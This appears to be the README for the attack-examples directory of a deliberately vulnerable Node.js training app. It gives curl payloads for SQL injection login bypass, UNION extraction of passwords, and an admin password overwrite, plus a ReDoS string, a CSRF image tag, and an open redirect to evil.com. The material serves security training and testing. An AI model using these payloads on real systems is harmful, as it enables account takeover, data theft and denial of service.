---
author: Daniel Garcia (cr0hn) - @ggdaniel
description: Proof-of-concept attack scripts and exploitation examples for Vulnerable Node
last_changed: 2025-11-05
---

# Attack Examples

This directory contains proof-of-concept scripts and documentation demonstrating how to exploit the vulnerabilities in the Vulnerable Node application.

## Table of Contents

- [Overview](#overview)
- [Available Attacks](#available-attacks)
- [Usage Guidelines](#usage-guidelines)
- [Attack Categories](#attack-categories)

## Overview

These attack examples are provided for:
- **Security testing** - Validate that security tools detect these vulnerabilities
- **Education** - Learn how attacks work in a safe environment
- **Training** - Practice exploitation techniques

> [!CAUTION]
> These scripts are for educational and authorized testing only. Never use them against systems you don't own or have explicit permission to test.

## Available Attacks

### sqli/ - SQL Injection

SQL injection attack examples demonstrating authentication bypass and data extraction.

**Vulnerabilities Exploited:**
- Authentication bypass (login)
- Data disclosure (product queries)
- Data manipulation (purchase injection)

### csrf/ - Cross-Site Request Forgery

CSRF attack examples showing how to forge purchase requests.

**Vulnerabilities Exploited:**
- Missing CSRF tokens
- GET-based state changes
- No origin validation

### evil_regex/ - Regular Expression Denial of Service (ReDoS)

Examples of catastrophic backtracking in the email validation regex.

**Vulnerabilities Exploited:**
- ReDoS in email validation pattern
- Algorithmic complexity attacks

### log_injection.sh - Log Injection

Script demonstrating log injection via unsanitized username input.

**Vulnerabilities Exploited:**
- Unescaped logging of user input
- Log forgery potential

## Usage Guidelines

> [!WARNING]
> Only use these attacks in controlled environments:
> - Local development machines
> - Authorized penetration testing labs
> - Security training environments

### Prerequisites

- Vulnerable Node application running
- Network access to the application
- Appropriate tools (curl, browser, scripts)

### Legal and Ethical Considerations

✅ **Allowed:**
- Testing your own deployment
- Educational purposes in controlled labs
- Security research with permission

❌ **Never:**
- Attack production systems
- Test systems without authorization
- Use for malicious purposes

## Attack Categories

### Authentication Attacks

**SQL Injection - Authentication Bypass**

```bash
# Bypass login with SQL injection
curl -X POST http://localhost:3000/login/auth \
  -d "username=admin' --&password=anything"
```

### Data Extraction Attacks

**SQL Injection - Extract User Data**

```bash
# Extract usernames and passwords via UNION injection
curl "http://localhost:3000/products/search?q=' UNION SELECT name, password, null, null, null FROM users --"
```

### Data Manipulation Attacks

**SQL Injection - Modify Purchase Data**

```bash
# Inject malicious data into purchase
curl -X POST http://localhost:3000/products/buy \
  -d "product_id=1&product_name=Test&price=1&mail=test'; UPDATE users SET password='hacked' WHERE name='admin'; --&..."
```

### Denial of Service Attacks

**ReDoS - Email Validation**

```bash
# Trigger catastrophic backtracking
curl -X POST http://localhost:3000/products/buy \
  -d "mail=aaaaaaaaaaaaaaaaaaaaaaaaaaaa@&product_id=1&..."
```

### Session Attacks

**CSRF - Forged Purchase**

```html
<!-- Embed in attacker's webpage -->
<img src="http://localhost:3000/products/buy?product_id=1&price=1€&..." />
```

### Redirect Attacks

**Open Redirect - Phishing**

```bash
# Redirect user to malicious site after login
curl "http://localhost:3000/login?returnurl=http://evil.com/phishing"
```

---

> [!NOTE]
> For detailed vulnerability documentation, see [SECURITY.md](../SECURITY.md)

> [!TIP]
> Use these examples as templates to create your own security test cases  